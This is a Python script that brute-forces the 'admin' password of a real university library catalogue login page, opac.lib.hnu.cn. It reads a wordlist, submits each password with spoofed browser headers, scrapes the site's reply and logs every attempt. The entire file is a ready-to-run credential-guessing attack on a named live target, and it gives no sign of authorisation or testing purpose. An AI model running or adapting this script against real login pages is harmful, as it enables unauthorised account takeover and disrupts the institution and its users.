#!/usr/bin/env  python3

import requests
import re
import sys

def run(url, password):
	s = requests.Session()

	payload = {'loginId':'admin', 'password':password, 'returnUrl':''}
	headers = {'Host': 'opac.lib.hnu.cn',
	        'Origin': 'http://opac.lib.hnu.cn',
	        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
	        'Content-Type': 'application/x-www-form-urlencoded',
	        'Referer': 'http://opac.lib.hnu.cn/opac/admin/doLogin',
	        'Accept-Encoding': 'gzip, deflate',
	        'Accept-Language': 'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4'
	    }

	r = s.post(url, params=payload, headers=headers)
	text = r.text
	pat = re.compile(r'<span class="message"><label>(.*?)</label></span>')
	success = re.findall(pat, text)

	return success[0]

def main():
	url = 'http://opac.lib.hnu.cn/opac/admin/doLogin'
	f = open(sys.argv[1], 'r')
	t = open('response', 'w+')
	while 1:
		password = f.readline().strip()
		if not password:
			break
		res = run(url, password) + '\t' + password
		t.write(res + '\n')
		print(res)
	t.close()
	f.close()

if __name__ == '__main__':
	main()